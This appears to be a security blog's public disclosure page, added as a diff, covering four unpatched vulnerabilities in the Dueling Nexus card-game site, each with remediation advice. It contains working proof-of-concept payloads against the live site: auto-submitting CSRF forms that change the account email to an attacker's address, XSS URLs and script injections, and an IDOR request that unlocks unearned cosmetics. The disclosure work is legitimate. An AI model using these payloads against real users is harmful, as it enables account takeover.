@@ -1,0 +1,373 @@
+<!DOCTYPE HTML>
+<html>
+  <head> <meta charset="utf-8" />
+<meta name="generator" content="Docutils 0.22.3: https://docutils.sourceforge.io/" />
+<title>Breakpoint: Vulnerabilities in Dueling Nexus</title>
+    <link rel="stylesheet" type="text/css" href="../style/base.css"/>
+    <link rel="stylesheet" type="text/css" href="../style/pygments.css"/>
+    <link rel="stylesheet" type="text/css" href="../style/math.css"/>
+
+    <link rel="icon" href="../image/favicon.ico" type="image/x-icon"/>
+
+    <link rel="alternate" type="application/rss+xml" title="Breakpoint RSS" href="../rss.xml"/>
+    <link rel="alternate" type="application/rss+xml" title="Stream of Consciousness RSS" href="../soc_rss.xml"/>
+    <!--
+        The RSS icon used in this page is derived from https://www.flaticon.com/free-icon/rss-feed-symbol_110
+        made by https://www.flaticon.com/authors/freepik. Thank you for providing quality, open work.
+    -->
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="site-title">
+        <div class="title-text">
+          <h1>Breakpoint</h1>
+          <h2>Stepping through security</h2>
+        </div>
+        <img src="../image/tomoko1.png"/>
+      </div>
+      <div class="wrap">
+
+        <ul>
+          <li>
+              <a href="../index.html">Index</a>
+              <a href="../rss.xml">
+                  <img src="../image/rss.png" />
+              </a>
+          </li>
+          <li><a href="https://github.com/cym13">Github</a></li>
+          <li><a href="../soc.html">SoC</a>
+              <a href="../soc_rss.xml">
+                  <img src="../image/rss.png" />
+              </a>
+          </li>
+          <li><a href="../cve.html">CVE</a></li>
+          <li><a href="../about.html">About</a></li>
+        </ul>
+      </div>
+    </header>
+
+    <div class="content">
+      <section id="vulnerabilities-in-dueling-nexus">
+<h2>Vulnerabilities in Dueling Nexus</h2>
+<section id="introduction">
+<h3>Introduction</h3>
+<p>Yu-Gi-Oh is a fun competitive card game (go Dragonmaids!). If you want to
+play online, the main game is Master Duel, an official platform by Konami
+which is frankly great. However, it only supports the Advanced format and
+uses a banlist which is different from the game on paper. If you want to play
+other formats (such as Genesys) or prepare for paper tournaments online, you
+need to turn to other clients.</p>
+<p>One such client is <a class="reference external" href="https://duelingnexus.com">Dueling Nexus</a>, a web-based
+free unofficial client which is great to play with friends or on a ladder.
+You can unlock cosmetics by playing and winning credits that can then be
+spent on special cosmetics. There is a donation service, but the game itself
+is completely free.</p>
+<p>As you know however, I cannot browse a new website without being curious
+about how it works exactly, and Dueling Nexus was no exception. Late
+September 2025, this lead to the discovery of several vulnerabilities on the
+website. I disclosed them to the developers, but as much as I like their
+commitment to building a great free playing space, their response left a lot
+to be desired. Reaching them was very difficult, I received no response
+whatsoever and as far as I can tell nothing has been fixed 3 months later. At
+this point it seems more important to put that information out there so the
+users may know what to expect rather than wait indefinitely.</p>
+<p>Of course, we need to adjust our expectations: this is not a banking website,
+it's a free trading card game. Most users would have neither high
+expectations of security, nor many secrets to protect. But there are some
+issues that are important regardless, and hardcore players are probably
+attached to their account.</p>
+<section id="what-it-means-to-players">
+<h4>What it means to players</h4>
+<p>There are issues, but nothing that would prevent me from playing on Dueling
+Nexus. However it's important to be cautious:</p>
+<ul class="simple">
+<li><p>Backup your decks so you don't lose them if someone takes over your account.</p></li>
+<li><p>Don't use shared computers, or clear the cookies before using it.</p></li>
+<li><p>Phishing is a main risk, so don't blindly click links to Dueling Nexus. If
+the URL looks unusual, don't click it. If you do click a malicious link,
+the attacker can do more than attack your Dueling Nexus account, they can
+also attack your computer and other computers on your network.</p></li>
+<li><p>You can technically get any cosmetics you want for free, but please refrain
+from doing so. It's a free game with a passionate community, let's not
+break that mutual trust that when you see someone with a badass frame they
+worked to obtain it.</p></li>
+<li><p>Do not put any secret on Dueling Nexus and in particular use a unique
+password specifically for that website that isn't shared with any other.
+Currently, the team at Dueling Nexus seems unbothered by the issues that we
+present here, which is not a posture that warrants confidence in the way
+they manage security on other topics. While I trust them to build a great
+game, I would not trust them with any secret.</p></li>
+</ul>
+<p>With that said, Dueling Nexus:</p>
+<img alt="../image/yu-gi-oh-time-to-duel.gif" src="../image/yu-gi-oh-time-to-duel.gif" style="width: 70%;" />
+<ul class="simple">
+<li><p><a class="reference external" href="#v1-session-fixation-1">V1: Session Fixation</a></p></li>
+<li><p><a class="reference external" href="#v2-cross-site-request-forgery-1">V2: Cross-Site Request Forgery</a></p></li>
+<li><p><a class="reference external" href="#v3-cross-site-scripting-1">V3: Cross-Site Scripting</a></p></li>
+<li><p><a class="reference external" href="#v4-insecure-direct-object-reference-1">V4: Insecure Direct Object Reference</a></p></li>
+</ul>
+</section>
+</section>
+<section id="v1-session-fixation-1">
+<h3>V1: Session Fixation</h3>
+<p><a class="reference external" href="https://www.first.org/cvss/calculator/4-0#CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N">CVSSv4 Score: 4.6 / Medium severity</a></p>
+<section id="description">
+<h4>Description</h4>
+<p>When first loading the website, a session token is provided by the website
+and stored in a cookie (PHPSESSID). The role of the cookie is to establish a
+session: this token will be sent with each request so the server knows that
+they all come from the same user.</p>
+<p>Normally, a new session token is provided upon login, but this is not the
+case here. This is a vulnerability called session fixation. Since this token
+is what authenticates the request, it carries the weight of a password once
+the user is logged in and must be protected against disclosure.</p>
+<p>Here the attack is as follows :</p>
+<ul class="simple">
+<li><p>Let's assume that multiple people are using the same computer (ex: in a
+school)</p></li>
+<li><p>Eve, the attacker, opens a <a class="reference external" href="https://duelingnexus.com">https://duelingnexus.com</a> in Firefox (any browser
+would do). At that point a session cookie is provided for her, but she
+doesn't log in.</p></li>
+<li><p>Eve looks in the browser's memory (F12 -&gt; Application -&gt; Cookies) and notes
+the content of the PHPSESSID cookie.</p></li>
+<li><p>Eve leaves the computer, leaving Firefox open.</p></li>
+<li><p>Alice comes in and decides to connect to <a class="reference external" href="https://duelingnexus.com">https://duelingnexus.com</a> to play a
+game. She logs in.</p></li>
+<li><p>At that point, the website should provide her with a fresh session token,
+but it doesn't. Instead it keeps using the one it already has, which is
+known to Eve.</p></li>
+<li><p>Eve has the session token, and she can now put it in her own browser's
+memory : when she loads <a class="reference external" href="https://duelingnexus.com">https://duelingnexus.com</a> she is now logged in as
+Alice.</p></li>
+</ul>
+<p>This attack is technically simple, but requires to be physically present.
+The impact is as high as it can be for Dueling Nexus and is easily fixed.</p>
+</section>
+<section id="remediation">
+<h4>Remediation</h4>
+<p>It is important to generate a new PHP session, and therefore issue a new
+session token, the moment the user logs in.</p>
+<p>The cookie PHPSESSID should also make use of security flags to protect its
+value : HttpOnly, Secure and SameSite=strict. These flags are protections
+against stealing cookies with XSS, sending cookies over HTTPS and Cross-Site
+Request Forgeries (see <a class="reference external" href="#v2-cross-site-request-forgery-1">Vulnerability 2</a>).</p>
+</section>
+</section>
+<section id="v2-cross-site-request-forgery-1">
+<h3>V2: Cross-Site Request Forgery</h3>
+<p><a class="reference external" href="https://www.first.org/cvss/calculator/4-0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N">CVSSv4 Score: 6.9 / Medium severity</a></p>
+<section id="description-1">
+<h4>Description</h4>
+<p>A Cross-Site Request Forgery (CSRF) exploits the fact that cookies are sent
+automatically upon any request to the domain they're tied with, even if the
+request isn't made from the same website.</p>
+<p>In practice the attack would go as follows :</p>
+<ul class="simple">
+<li><p>Eve prepares a website (something juicy, like some ygo scandal at a YCS).
+In the website, she puts a special bit of javascript that makes a request
+to <a class="reference external" href="https://duelingnexus.com">https://duelingnexus.com</a> that changes the current account's email to
+<a class="reference external" href="mailto:eve&#64;malicious.net">eve&#64;malicious.net</a>.</p></li>
+<li><p>Eve sends her website's adress on the discord</p></li>
+<li><p>Alice is connected on Dueling Nexus when she sees Eve's message. Intrigued,
+she clicks on the link.</p></li>
+<li><p>Alice loads Eve's website, and the associated javascript. A request is made
+to change the current account's email (so Alice's in this case) to one
+owned by Eve. It works because, since Alice is connected, that change
+request is made with Alice's credentials (session cookie).</p></li>
+<li><p>Alice sees that she's back on Dueling Network's profile page, but doesn't
+understand what happened.</p></li>
+<li><p>In parallel, Eve makes a password recovery request for <a class="reference external" href="mailto:eve&#64;malicious.net">eve&#64;malicious.net</a>,
+gets the code, and changes the password. Eve now has full control over
+Alice's account.</p></li>
+</ul>
+<p>Here is an example of the page Eve could use in this scenario : when visited
+it performs a mail change to &quot;<a class="reference external" href="mailto:eve&#64;malicious.net">eve&#64;malicious.net</a>&quot;.</p>
+<pre class="code html literal-block"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Vulnerability 2 : CSRF<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;changemail&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://duelingnexus.com/api/update-email.php&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;eve&#64;malicious.net&quot;</span><span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="w">
+      </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'changemail'</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span><span class="w">
+    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre>
+<p>This attack involves an explicit action from the victim (visiting Eve's
+website) but people visit new web pages all the time so it is a reasonable
+threat. The impact is as high as it can for Dueling Nexus.</p>
+<p>Note: some but not all web browsers may block this attack by default.</p>
+</section>
+<section id="remediation-1">
+<h4>Remediation</h4>
+<p>There are mechanisms to prevent this. The main idea is to make sure that the
+request to change something on the server side, comes from the website itself
+and not some random page visited on the net.</p>
+<p>There are several ways to tackle the problem: SameSite is the easiest of the
+two to setup as it is just a cookie flag.  Adding &quot;SameSite=Strict&quot; (or,
+worse but ok, SameSite=Lax) to the PHPSESSID cookie would indicate to the
+browser that it must not authenticate that password change request.</p>
+<p>This method is simple to setup and is what I recommend in this case. There
+are limitations, and alternatives, but from what I see this is the best
+option here so I won't discuss them.</p>
+</section>
+</section>
+<section id="v3-cross-site-scripting-1">
+<h3>V3: Cross-Site Scripting</h3>
+<p><a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N">CVSSv4 Score: 5.1 / Medium severity</a></p>
+<section id="description-2">
+<h4>Description</h4>
+<p>Dueling Nexus' API (<a class="reference external" href="https://duelingnexus.com/api/">https://duelingnexus.com/api/</a>...) always returns JSON data,
+but with the content type &quot;text/html&quot;.</p>
+<p>To see it, you can open the developer tools of the browser (F12 generally),
+Network tab to see what requests are made, then opening
+<a class="reference external" href="https://duelingnexus.com/api/news.php">https://duelingnexus.com/api/news.php</a> for example. By doing that you see two
+things: in the list of requests, the response to news.php will have a header
+&quot;Content-Type: text/html&quot;, and in the main browser's window you'll see that
+the JSON data is formatted: links, images and bold text are present. This
+indicates that the response, despite being in JSON and not HTML, was
+interpreted as HTML. This is something an attacker can use.</p>
+<p>If an attacker, can force a JSON response to contain malicious
+HTML/javascript, then anyone loading that JSON response directly would see
+that javascript executed, and some malicious action would happen in their
+session. This execution of user-controlled javascript is a vulnerability
+called Cross-Site Scripting (commonly known as XSS).</p>
+<p>Here is a URL showcasing that vulnerability:</p>
+<pre class="literal-block">https://duelingnexus.com/api/update-email.php?email=%3Cimg%20src%3Dx%20onerror%3Dalert(89827491);%20x%3Da%3E%20a&#64;example.com</pre>
+<p>When clicking that link while logged in Dueling Nexus, our mail is changed
+and we receive a JSON response that includes the new mail. Since that
+response's Content-Type is not set to JSON but HTML, by including HTML code
+in our email we are able to reach arbitrary Javascript execution.</p>
+<p>The same principle can be applied at other points, such as through deck
+searches. That attack is a bit more involved, so here's a narrative
+description:</p>
+<ul class="simple">
+<li><p>Eve, our attacker, creates an account and creates a deck with the a name
+containing javascript. For example:</p></li>
+</ul>
+<pre class="code html literal-block"><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1337</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre>
+<ul class="simple">
+<li><p>Eve sets the deck to be public. The deck now comes up in deck searches.</p></li>
+<li><p>Eve now needs a way to get users to search that deck, without using the web
+interface, but instead using the API directly. To do that, she'll use a
+CSRF (see Vulnerability 2). She creates a page that, when visited, will
+perform the corresponding search. Here is the code she can use:</p></li>
+</ul>
+<pre class="code html literal-block"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Vulnerability 3 : XSS<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;doSearch&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://duelingnexus.com/api/deck-search.php&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;name&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1337&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;tag&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;-1&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;special&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;-1&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;sort&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;0&quot;</span><span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="w">
+      </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'doSearch'</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span><span class="w">
+    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre>
+<ul class="simple">
+<li><p>Now Eve shares a link to the page above to potential victims, like Alice.</p></li>
+<li><p>Alice clicks on Eve's link, loading the malicious page that performs a deck
+search, and the resulting page executes javascript on
+<a class="reference external" href="https://duelingnexus.com/">https://duelingnexus.com/</a>. In this case a popup appears (in some browser
+configuration, it may not appear, but the javascript is still executed).</p></li>
+<li><p>This javascript displaying a popup isn't harmful to Alice, but it could be
+more dangerous. Since it is executed in Alice's session, it can do
+anything on the website that Alice can do, including changing Alice's mail
+to allow Eve to take over her account by using the account recovery
+process.</p></li>
+</ul>
+<p>While this specific attack uses a CSRF, it's worth noting that it wouldn't be
+stopped by SameSite since the deck search is available to unauthenticated
+users. Also, it's very possible that other XSS are present that don't require
+the help of a CSRF, but this is the first exploit I identified.</p>
+<p>XSS are a dangerous vulnerability and, in this case they are enabled by the
+use of the wrong Content-Type on the API. An attacker using an XSS controls
+your web browser. It can not only do anything within Dueling Nexus that you
+can, but also use your web browser to attack your computer or other computers
+on your network.</p>
+</section>
+<section id="remediation-2">
+<h4>Remediation</h4>
+<p>The solution is simple: since the API returns JSON, it must use a content
+type &quot;application/json&quot;.</p>
+<p>It would also be interesting to have the HttpOnly flag on the PHPSESSID
+cookie, as that would make it unavailable through javascript. This means that
+an XSS would not be able to steal the cookie. This doesn't make XSS less
+dangerous, but it does make it harder for the attacker to remain in discreet
+control of the account.</p>
+</section>
+</section>
+<section id="v4-insecure-direct-object-reference-1">
+<h3>V4: Insecure Direct Object Reference</h3>
+<p><a class="reference external" href="https://www.first.org/cvss/calculator/4-0#CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N">CVSSv4 Score : 5.3 / Medium</a></p>
+<section id="description-3">
+<h4>Description</h4>
+<p>It is possible to use cosmetics that we haven't unlocked. That's because,
+when we set a cosmetics, the API doesn't check that we have legitimate access
+to it.</p>
+<p>To set a portrait for example, a POST request is made to
+<a class="reference external" href="https://duelingnexus.com/api/update-portrait.php">https://duelingnexus.com/api/update-portrait.php</a> with in body
+&quot;portrait=&lt;portrait id&gt;&quot;.</p>
+<p>We can pass any portrait id, no verification is performed. So for example
+passing &quot;portrait=33&quot; gives us a portrait that we do not have:</p>
+<img alt="../image/dueling_nexus_portrait.png" src="../image/dueling_nexus_portrait.png" style="width: 90%;" />
+<p>Such a vulnerability is called Insecure Direct Object Reference (IDOR). This
+reflects the fact that we can directly interact with objects (portraits in
+this case) without proper limitations in place.</p>
+<p>The same is true of of sleeves, frames, playmats or avatars.</p>
+<p>While this vulnerability's impact isn't really stealing anyone, the use of
+cosmetics by people that haven't earned them cheapens the value they
+represent for players that have put in the effort to earn them legitimately.</p>
+</section>
+<section id="remediation-3">
+<h4>Remediation</h4>
+<p>When receiving a request to update a cosmetics, a check must be performed to
+ensure that the user has legitimate access to that cosmetics.</p>
+</section>
+</section>
+<section id="conclusion">
+<h3>Conclusion</h3>
+<p>This was far from a full audit. I limited my tests at things that were easy
+to see simply from navigating the website and didn't test anything that could
+negatively impact other players or jeopardize the availability of the server.
+I also didn't test duels with other players, or the security of Wordpress, a
+popular framework that can easily be misconfigured or include vulnerable
+extensions.</p>
+<p>Now, none of this is really critical. I wouldn't let these issues prevent me
+from playing the game, but it does demand caution.</p>
+<p>It is clear that security leaves to be desired and I would not expect
+these findings to be the only vulnerabilities lurking on Dueling Nexus. This
+is further emphasized by the cold reaction by the Dueling Nexus team that
+made no effort to facilitate communication, provided no response and
+especially no fix for these issues.</p>
+</section>
+<section id="timeline">
+<h3>Timeline</h3>
+<ul class="simple">
+<li><p>2025-09-30: Report written.</p></li>
+<li><p>2025-10-01: Vulnerabilities reported to Dueling Nexus. No response.</p></li>
+<li><p>2026-02-11: Public disclosure.</p></li>
+</ul>
+</section>
+</section>
+    </div>
+    <footer "class"="site-footer">
+      <div "class"="publication_date">
+        First published: 
+      </div>
+    </footer>
+  </body>
+</html>
